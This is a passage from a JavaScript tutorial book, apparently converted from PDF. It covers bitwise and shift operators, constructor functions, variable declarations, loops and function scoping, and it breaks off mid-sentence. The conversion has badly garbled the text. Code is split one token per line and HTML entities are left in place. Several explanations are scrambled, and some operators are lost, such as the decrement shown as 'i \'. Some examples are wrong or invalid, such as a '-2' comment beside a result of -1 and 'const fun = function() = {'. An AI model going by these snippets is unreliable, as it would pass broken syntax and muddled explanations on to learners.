<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch15">Chapter 15: Bitwise operators</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch15-1">Section 15.1: Bitwise operators</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Bitwise operators perform operations on bit values of data. These
operators convert operands to signed 32-bit integers in [two&apos;s
complement](http://stackoverflow.com/questions/1049722/what-is-2s-complement).
**Conversion to 32-bit integers**
Numbers with more than 32 bits discard their most significant bits.
For example, the following integer with more than 32 bits is converted
to a 32-bit integer:
Before
:
10100110111110100000000010000011110001000001
After
:
10100000000010000011110001000001
**Two&apos;s Complement**
In normal binary we find the binary value by adding the 1&apos;s based on
their position as powers of 2 - The rightmost bit being 2&Hat;0 to the
leftmost bit being 2&Hat;n-1 where n is the number of bits. For example,
using 4 bits:

*// Normal Binary*
*// 8 4 2 1*
0
1
1
0
=&gt;
0
&plus;
4
&plus;
2
&plus;
0
=&gt;
6
Two complement&apos;s format means that the number&apos;s negative counterpart
(6 vs -6) is all the bits for a number inverted, plus one. The
inverted bits of 6 would be:
*// Normal binary*
0
1
1
0
*// One&apos;s complement (all bits inverted)*
1
0
0
1
=&gt;
&minus;
8
&plus;
0
&plus;
0
&plus;
1
=&gt;
&minus;
7
*// Two&apos;s complement (add 1 to one&apos;s complement)*
1
0
1
0
=&gt;
&minus;
8
&plus;
0
&plus;
2
&plus;
0
=&gt;
&minus;
6
*Note:* Adding more 1&apos;s to the left of a binary number does not
change its value in two&apos;s compliment. The value 1010 and
1111111111010 are both -6.
**Bitwise AND**
a & b
The bitwise AND operation returns the binary value with a 1 where both
binary operands have 1&apos;s in a specific position, and 0 in all other
positions. For example:
13
&
7
=&gt;
5
*// 13: 0..01101*
*// 7: 0..00111*
*//&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&ast;
*// 5: 0..00101 (0 + 0 + 4 + 0 + 1)*
**Real world example: Number&apos;s Parity Check**

Instead of this &quot;masterpiece&quot; (unfortunately too often seen in many
real code parts):
**function**
isEven
(
n
)
{
**return**
n
&percnt;
2
==
0
;
}
**function**
isOdd
(
n
)
{
**if**
(
isEven
(
n
)
)
{
**return**
**false**
;
}
**else**
{
**return**
**true**
;
}
}
You can check the (integer) number&apos;s parity in much more effective
and simple manner:
**if**
(
n
&
1
)
{
console.
log
(
&quot;ODD!&quot;
)
;
}
**else**
{
console.
log
(
&quot;EVEN!&quot;
)
;
}
**Bitwise OR**
a &vert; b
The bitwise OR operation returns the binary value with a 1 where
either operands or both operands have 1&apos;s in a specific position, and
0 when both values have 0 in a position. For example:
13
&vert;
7
=&gt;
15
*// 13: 0..01101*
*// 7: 0..00111*
*//&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&ast;
*// 15: 0..01111 (0 + 8 + 4 + 2 + 1)*
**Bitwise NOT**

The bitwise NOT operation &bsol;~a *flips* the bits of the given value a.
This means all the 1&apos;s will become 0&apos;s and all the 0&apos;s will become
1&apos;s.
&bsol;~13 =&minus;14
// 13: 0..01101
//&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&bsol;
//-14: 1..10010 (-16 + 0 + 0 + 2 + 0)
**Bitwise XOR**
a  &Hat; b

The bitwise XOR (*exclusive or*) operation places a 1 only if the two
bits are different. Exclusive or means *either one or the other, but
not both*.
13
&Hat;
7
=&gt;
10
*// 13: 0..01101*
*// 7: 0..00111*
*//&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&ast;
*// 10: 0..01010 (0 + 8 + 0 + 2 + 0)*
**Real world example: swapping two integer values without additional
memory allocation**
**var**
a
=
11
,
b
=
22
;
a
=
a
&Hat;
b
;
b
=
a
&Hat;
b
;
a
=
a
&Hat;
b
;
console.
log
(
&quot;a = &quot;
&plus;
a
&plus;
&quot;; b = &quot;
&plus;
b
)
;
*// a is now 22 and b is now 11*
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch15-2">Section 15.2: Shift Operators</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Bitwise shifting can be thought as &quot;moving&quot; the bits either left or
right, and hence changing the value of the data operated on.
**Left Shift**
value ) &lt;&lt; ( shift amount ) will shift the bits to the shift amount
left by (
The left shift operator () bits; the new bits coming in from the right
will be 0&apos;s:
5
&lt;&lt;
2
=&gt;
20
*// 5: 0..000101*
*// 20: 0..010100 &lt;= adds two 0&apos;s to the right*
**Right Shift (*Sign-propagating*)**
value ) &gt;&bsol;  ( shift amount
The right shift operator () is also known as the &quot;Sign-propagating
right shift&quot; because it

keeps the sign of the initial operand. The right shift operator shifts
the value the specified shift amount of bits to the right. Excess bits
shifted off the right are discarded. The new bits coming in from the
left will be based on the sign of the initial operand. If the
left-most bit was 1 then the new bits will all be 1 and vice-versa for
0&apos;s.
20
&gt;&gt;
2
=&gt;
5
*// 20: 0..010100*
*// 5: 0..000101 &lt;= added two 0&apos;s from the left and chopped off 00
from the right*
&minus;
5
&gt;&gt;
3
=&gt;
&minus;
1
*// -5: 1..111011*
*// -2: 1..111111 &lt;= added three 1&apos;s from the left and chopped off 011
from the right*
**Right Shift (*Zero fill*)**
value ) &gt;&gt;&bsol; ( shift amount

The zero-fill right shift operator () will move the bits to the right,
and the new bits will

be 0&apos;s. The 0&apos;s are shifted in from the left, and excess bits to the
right are shifted off and discarded. This means it can make negative
numbers into positive ones.
&minus;
30
&gt;&gt;&gt;
2
=&gt;
1073741816
*// -30: 111..1100010*
*//1073741816: 001..1111000*
Zero-fill right shift and sign-propagating right shift yield the same
result for non negative numbers.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch16">Chapter 16: Constructor functions</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch16-1">Section 16.1: Declaring a constructor function</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Constructor functions are functions designed to construct a new
object. Within a constructor function, the keyword **this** refers to
a newly created object which values can be assigned to. Constructor
functions &quot;return&quot; this new object automatically.
**function**
Cat
(
name
)
{
**this**
.
name
=
name
;
**this**
.
sound
=
&quot;Meow&quot;
;
}
Constructor functions are invoked using the **new** keyword:
**let**
cat
=
**new**
Cat
(
&quot;Tom&quot;
)
;
cat.
sound
;
*// Returns &quot;Meow&quot;*
Constructor functions also have a **prototype** property which points
to an object whose properties are automatically inherited by all
objects created with that constructor:
Cat.
**prototype**
.
speak
=
**function**
(
)
{
console.
log
(
**this**
.
sound
)
;
}
cat.
speak
(
)
;
*// Outputs &quot;Meow&quot; to the console*
Objects created by constructor functions also have a special property
on their prototype called constructor, which points to the function
used to create them:
cat.
constructor
*// Returns the &grave;Cat&grave; function*
Objects created by constructor functions are also considered to be
&quot;instances&quot; of the constructor function by the **instanceof**
operator:
cat
**instanceof**
Cat
*// Returns &quot;true&quot;*
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch17">Chapter 17: Declarations and Assignments</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch17-1">Section 17.1: Modifying constants</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Declaring a variable **const** only prevents its value from being
*replaced* by a new value. **const** does not put any restrictions on
the internal state of an object. The following example shows that a
value of a property of a **const** object can be changed, and even new
properties can be added, because the object that is assigned to person
is modified, but not *replaced*.
**const**
person
=
{
name
:
&quot;John&quot;
}
;
console.
log
(
&apos;The name of the person is&apos;
,
person.
name
)
;
person.
name
=
&quot;Steve&quot;
;
console.
log
(
&apos;The name of the person is&apos;
,
person.
name
)
;
person.
surname
=
&quot;Fox&quot;
;
console.

log

(

&apos;The name of the person is&apos;
,
person.
name
,
&apos;and the surname is&apos;
,
person.
surname
)
;
**Result:**
The name of the person is John
The name of the person is Steve
The name of the person is Steve and the surname is Fox
person.name
person.surname
In this example we&apos;ve created constant object called person and
we&apos;ve reassigned property and created new property.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch17-2">Section 17.2: Declaring and initializing constants</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
You can initialize a constant by using the **const** keyword.
**const**
foo
=
100
;
**const**
bar
=
**false**
;
**const**
person
=
{
name
:
&quot;John&quot;
}
;
**const**
fun
=
**function**
(
)
=
{
*/&ast; &hellip; &ast;/*
}
;
**const**
arrowFun
=
(
)
=&gt;
*/&ast; &hellip; &ast;/*
;
**Important**
You must declare and initialize a constant in the same statement.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch17-3">Section 17.3: Declaration</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
There are four principle ways to declare a variable in JavaScript:
using the **var**, **let** or **const** keywords, or without a keyword
at all (&quot;bare&quot; declaration). The method used determines the
resulting scope of the variable, or reassignability in the case of
**const**.
The
**var**
keyword creates a function-scope variable.
The
**let**
keyword creates a block-scope variable.
The
**const**
keyword creates a block-scope variable that cannot be reassigned.
A bare declaration creates a global variable.
**var**
a
=
&apos;foo&apos;
;
*// Function-scope*
**let**
b
=
&apos;foo&apos;
;
*// Block-scope*
**const**
c
=
&apos;foo&apos;
;
*// Block-scope & immutable reference*
Keep in mind that you can&apos;t declare constants without initializing
them at the same time. **const** foo; *// &quot;Uncaught SyntaxError:
Missing initializer in const declaration&quot;*
(An example of keyword-less variable declaration is not included above
for technical reasons. Continue reading to see an example.)
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch17-4">Section 17.4: Undefined</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Declared variable without a value will have the value **undefined**
**var**
a
;
console.
log
(
a
)
;
*// logs: undefined*
Trying to retrieve the value of undeclared variables results in a
ReferenceError. However, both the type of undeclared and unitialized
variables is &quot;undefined&quot;:
**var**
a
;
console.
log
(
**typeof**
a
===
&quot;undefined&quot;
)
;
*// logs: true*
console.
log
(
**typeof**
variableDoesNotExist
===
&quot;undefined&quot;
)
;
*// logs: true*
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch17-5">Section 17.5: Data Types</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
JavaScript variables can hold many data types: numbers, strings,
arrays, objects and more:
*// Number*
**var**
length
=
16
;
*// String*
**var**
message
=
&quot;Hello, World!&quot;
;
*// Array*
**var**
carNames
=
&lbrack;
&apos;Chevrolet&apos;
,
&apos;Nissan&apos;
,
&apos;BMW&apos;
&rbrack;
;
*// Object*
**var**
person
=
{
firstName
:
&quot;John&quot;
,
lastName
:
&quot;Doe&quot;
}
;
JavaScript has dynamic types. This means that the same variable can be
used as different types:
**var**
a
;
*// a is undefined*
**var**
a
=
5
;
*// a is a Number*
**var**
a
=
&quot;John&quot;
;
*// a is a String*
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch17-6">Section 17.6: Mathematic operations and assignment</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
**Increment by**
**var**
a
=
9
,
b
=
3
;
b
+=
a
;
b will now be 12

This is functionally the same as
b
=
b
&plus;
a
;
**Decrement by**
**var**
a
=
9
,
b
=
3
;
b
-=
a
;
b
will now be 6
This is functionally the same as
b
=
b
&minus;
a
;
**Multiply by**
**var**
a
=
5
,
b
=
3
;
b
&ast;=
a
;
b
will now be 15
This is functionally the same as
b
=
b
&ast;
a
;
**Divide by**
**var**
a
=
3
,
b
=
15
;
b
/=
a
;
b
will now be 5
This is functionally the same as
b
=
b
/
a
;
<h5>Version ≥ 7</h5>
**Raised to the power of**
**var**
a
=
3
,
b
=
15
;
b
&ast;&ast;=
a
;
b will now be 3375
This is functionally the same as
b
=
b
&ast;&ast;
a
;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch17-7">Section 17.7: Assignment</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
To assign a value to a previously declared variable, use the
assignment operator, =:
a
=
6
;
b
=
&quot;Foo&quot;
;
As an alternative to independent declaration and assignment, it is
possible to perform both steps in one statement:
**var**
a
=
6
;
**let**
b
=
&quot;Foo&quot;
;
It is in this syntax that global variables may be declared without a
keyword; if one were to declare a bare variable without an assignment
immediately afterword, the interpreter would not be able to
differentiate global declarations a; from references to variables a;.
c
=
5
;
c
=
&quot;Now the value is a String.&quot;
;
myNewGlobal
;
*// ReferenceError*
Note, however, that the above syntax is generally discouraged and is
not strict-mode compliant. This is to avoid the scenario in which a
programmer inadvertently drops a **let** or **var** keyword from their
statement, accidentally creating a variable in the global namespace
without realizing it. This can pollute the global namespace and
conflict with libraries and the proper functioning of a script.
Therefore global variables should be declared and initialized using
the **var** keyword in the context of the window object, instead, so
that the intent is explicitly stated.

Additionally, variables may be declared several at a time by
separating each declaration (and optional value assignment) with a
comma. Using this syntax, the var and let keywords need only be used
once at the beginning of each statement.

globalA
=
&quot;1&quot;
,
globalB
=
&quot;2&quot;
;
**let**
x
,
y
=
5
;
**var**
person
=
&apos;John Doe&apos;
,
foo
,
age
=
14
,
date
=
**new**
Date
(
)
;
Notice in the preceding code snippet that the order in which declaration
and assignment expressions occur (
**var**
a
,
b
,
c
=
2
,
d
;
)
does not matter. You may freely intermix the two.
Function declaration effectively creates variables, as well.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch18"># Chapter 18: Loops</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch18-1">Section 18.1: Standard &quot;for&quot; loops</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
**Standard usage**
**for**
(
**var**
i
=
0
;
i
&lt;
100
;
i
++
)
{
console.
log
(
i
)
;
}
Expected output:
0
1
&hellip;
99
**Multiple declarations**

Commonly used to cache the length of an array.
**var**
array
=
&lbrack;
&apos;a&apos;
,
&apos;b&apos;
,
&apos;c&apos;
&rbrack;
;
**for**
(
**var**
i
=
0
;
i
&lt;
array.
length
;
i
++
)
{
console.
log
(
array
&lbrack;
i
&rbrack;
)
;
}
Expected output:
&apos;a&apos;
&apos;b&apos;
&apos;c&apos;
**Changing the increment**
**for**
(
**var**
i
=
0
;
i
&lt;
100
;
i
+=
2
*/&ast; Can also be: i = i + 2 &ast;/*
)
{
console.
log
(
i
)
;
}
Expected output:
0
2
4
&hellip;
98
**Decremented loop**
**for**
(
**var**
i
=
100
;
i
&gt;=
0
;
i
&bsol;
)
{
console.
log
(
i
)
;
}
Expected output:
100
99
98
&hellip;
0
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch18-2">Section 18.2: &quot;for &hellip; of&quot; loop</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
<h5>Version ≥ 6</h5>
**const**
iterable
=
&lbrack;
0
,
1
,
2
&rbrack;
;
**for**
(
**let**
i of iterable
)
{
console.
log
(
i
)
;
}
Expected output:
>
0
>
1
>
2
>
The advantages from the for&hellip;of loop are:
forEach
This is the most concise, direct syntax yet for looping through array
elements

It avoids all the pitfalls of for&hellip;in Unlike (), it works with
break, continue, and return

**Support of for&hellip;of in other collections Strings** for&hellip;of will
treat a string as a sequence of Unicode characters:
**const**
string
=
&quot;abc&quot;
;
**for**
(
**let**
chr of string
)
{
console.
log
(
chr
)
;
}
Expected output:
a b c
**Sets** for&hellip;of works on Set objects.

**Note**:
Set
A Set object will eliminate duplicates.

Please [check this
reference](https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Global_Objects/Set#Browser_compatibility)
for () browser support.
**const**
names
=
&lbrack;
&apos;bob&apos;
,
&apos;alejandro&apos;
,
&apos;zandra&apos;
,
&apos;anna&apos;
,
&apos;bob&apos;
&rbrack;
;
**const**
uniqueNames
=
**new**
Set
(
names
)
;
**for**
(
**let**
name of uniqueNames
)
{
console.
log
(
name
)
;
}
Expected output:
>
bob
>
alejandro zandra anna
>
**Maps**
>
You can also use for&hellip;of loops to iterate over Maps. This works
similarly to arrays and sets, except the iteration variable stores
both a key and a value.
**const**
map
=
**new**
Map
(
)
.
**set**
(
&apos;abc&apos;
,
1
)
.
**set**
(
&apos;def&apos;
,
2
)
**for**
(
**const**
iteration of map
)
{
console.
log
(
iteration
)
*//will log &lbrack;&apos;abc&apos;, 1&rbrack; and then &lbrack;&apos;def&apos;, 2&rbrack;*
}
You can use destructuring assignment to capture the key and the value
separately:
**const**
map
=
**new**
Map
(
)
.
**set**
(
&apos;abc&apos;
,
1
)
.
**set**
(
&apos;def&apos;
,
2
)
**for**
(
**const**
&lbrack;
key
,
value
&rbrack;
of map
)
{
console.
log
(
key
&plus;
&apos; is mapped to &apos;
&plus;
value
)
}
*/&ast;Logs:*
*abc is mapped to 1*
*def is mapped to 2*
*&ast;/*
**Objects**
Object.keys
for&hellip;of loops *do not* work directly on plain Objects; but, it is
possible to iterate over an object's properties by switching to a
for&hellip;in loop, or using ():
**const**
someObject
=
{
name
:
&apos;Mike&apos;
}
;
**for**
(
**let**
key of
Object
.
keys
(
someObject
)
)
{
console.
log
(
key
&plus;
&quot;: &quot;
&plus;
someObject
&lbrack;
key
&rbrack;
)
;
}
Expected output:
name: Mike
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch18-3">Section 18.3: &quot;for &hellip; in&quot; loop</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
**Warning**

for&hellip;in is intended for iterating over object keys, not array indexes.

[Using it to loop through an array i]

[s](http://stackoverflow.com/questions/500504/why-is-using-for-in-with-array-iteration-such-a-bad-idea)

[generally discourage]

[d](http://stackoverflow.com/questions/500504/why-is-using-for-in-with-array-iteration-such-a-bad-idea)

. It also includes properties from the prototype, so it may be necessary
to check if

the key is within the object using

hasOwnProperty

. If any attributes in the object are defined by the

defineProperty

/

s

definePropertie

method and set the param

enumerable

:

**false**

, those attributes will

be inaccessible.

**var**

object

=

{

&quot;a&quot;

:

&quot;foo&quot;

,

&quot;b&quot;

:

&quot;bar&quot;

,

&quot;c&quot;

:

&quot;baz&quot;

}

;

*// &grave;a&grave; is inaccessible*

Object

.

defineProperty

(

object

,

&apos;a&apos;

,

{

enumerable

:

**false**

,

}

)

;

**for**

(

**var**

key

**in**

object

)

{

**if**

(

object.

hasOwnProperty

(

key

)

)

{

console.

log

(

&apos;object.&apos;

&plus;

key

&plus;

&apos;, &apos;

&plus;

object

&lbrack;

key

&rbrack;

)

;

}

}

Expected output:

object.b, bar object.c, baz

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch18-4">Section 18.4: &quot;while&quot; Loops</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
**Standard While Loop**

A standard while loop will execute until the condition given is false:

**var**

i

=

0

;

while

(

i

&lt;

100

)

{

console.

log

(

i

)
;
i
++
;
}
Expected output:
0
1
&hellip;
99
**Decremented loop**
**var**
i
=
100
;
while
(
i
&gt;
0
)
{
console.
log
(
i
)
;
i
&bsol;
;
*/&ast; equivalent to i=i-1 &ast;/*
}
Expected output:
>
100
>
99
>
98
>
&hellip;
>
1
>
**Do&hellip;while Loop**
>
A do&hellip;while loop will always execute at least once, regardless of
whether the condition is true or false:

**var**
i
=
101
;
**do**
{
console.
log
(
i
)
;
}
while
(
i
&lt;
100
)
;
Expected output:
101
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch18-5">Section 18.5: &quot;continue&quot; a loop</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
**Continuing a &quot;for&quot; Loop**
++
When you put the **continue** keyword in a for loop, execution jumps
to the update expression (i in the example):
**for**
(
**var**
i
=
0
;
i
&lt;
3
;
i
++
)
{
**if**
(
i
===
1
)
{
**continue**
;
}
console.
log
(
i
)
;
}
Expected output:
>
0
>
2
**Continuing a While Loop**
When you
**continue**
in a while loop, execution jumps to the condition (
i
&lt;
3
in the example):
**var**
i
=
0
;
while
(
i
&lt;
3
)
{
**if**
(
i
===
1
)
{
i
=
2
;
**continue**
;
}
console.
log
(
i
)
;
i
++
;
}
Expected output:
>
0
>
2
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch18-6">Section 18.6: Break specific nested loops</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
We can name our loops and break the specific one when necessary.
outerloop
:
**for**
(
**var**
i
=
0
;
i
&lt;
3
;
i
++
)
{
innerloop
:
**for**
(
**var**
j
=
0
;
j
&lt;
3
;
j
++
)
{
console.
log
(
i
)
;
console.
log
(
j
)
;
**if**
(
j
==
1
)
{
**break**
outerloop
;
}
}
}
Output:
0
0
0
1
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch18-7">Section 18.7: &quot;do &hellip; while&quot; loop</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
**var**
availableName
;
**do**
{
availableName

getRandomName
(
)
;
}
while
(
isNameUsed
(
name
)
)
;
**do** while
A loop is guaranteed to run at least once as it&apos;s condition is only
checked at the end of an iteration. A traditional while loop may run
zero or more times as its condition is checked at the beginning of an
iteration.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch18-8">Section 18.8: Break and continue labels</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Break and continue statements can be followed by an optional label
which works like some kind of a goto statement, resumes execution from
the label referenced position
**for**
(
**var**
i
=
0
;
i
&lt;
5
;
i
++
)
{
nextLoop2Iteration
:
**for**
(
**var**
j
=
0
;
j
&lt;
5
;
j
++
)
{
**if**
(
i
==
j
)
**break**
nextLoop2Iteration
;
console.
log
(
i
,
j
)
;
}
}
***i=0 j=0 skips rest of j values***
1
0
***i=1 j=1 skips rest of j values***
2
0
2
1
***i=2 j=2 skips rest of j values***
0
3
1
3
3
2
***i=3 j=3 skips rest of j values***
4
0
4
1
4
2
4
3
***i=4 j=4 does not log and loops are done***
<h2 id="ch19">Chapter 19: Functions</h2>
Functions in JavaScript provide organized, reusable code to perform a
set of actions. Functions simplify the coding process, prevent
redundant logic, and make code easier to follow. This topic describes
the declaration and utilization of functions, arguments, parameters,
return statements and scope in JavaScript.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch19-1">Section 19.1: Function Scoping</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
When you define a function, it creates a *scope*.

Everything defined within the function is not accessible by code
outside the function. Only code within this scope can see the entities
defined inside the scope.

**function**

foo

(

)

{

**var**

a

=

&apos;hello&apos;

;

console.

log

(

a

)

;

*// =&amp;apos;hello&apos;*

}

console.

log

(

a

)

;

*// reference error*

Nested functions are possible in JavaScript and the same rules apply.

**function**

foo

(

)

{

**var**

a

=

&apos;hello&apos;

;

**function**

bar

(

)

{

**var**

b

=

&apos;world&apos;

;

console.

log

(

a

)

;

*// =&amp;apos;hello&apos;*

console.

log

(

b

)

;

*// =&amp;apos;world&apos;*

}

console.

log

(

a

)

;

*// =&amp;apos;hello&apos;*

console.

log

(

b

)

;

*// reference error*

}

console.

log

(

a

)

;

*// reference error*

console.

log

(

b

)

;

*// reference error*

When JavaScript tries to resolve a reference or variable, it starts
looking for it in the current scope. If it cannot find that
declaration in the current scope, it climbs up one scope to look for
it. This process repeats until the declaration has been found. If the
JavaScript parser reaches the global scope and still cannot find the
reference, a reference error will be thrown.

**var**

a

=

&apos;hello&apos;

;

**function**

foo

(

)

{

**var**

b

=

&apos;world&apos;

;

**function**

bar

(

)

{

**var**

c

=

&apos;!!&apos;

;

console.

log

(

a

)

;

*// =&amp;apos;hello&apos;*

console.

log

(

b

)

;

*// =&amp;apos;world&apos;*

console.

log

(

c

)

;

*// =&amp;apos;!!&apos;*

console.

log

(

d

)

;

*// reference error*

}

}

This climbing behavior can also mean that one reference may &quot;shadow&quot;
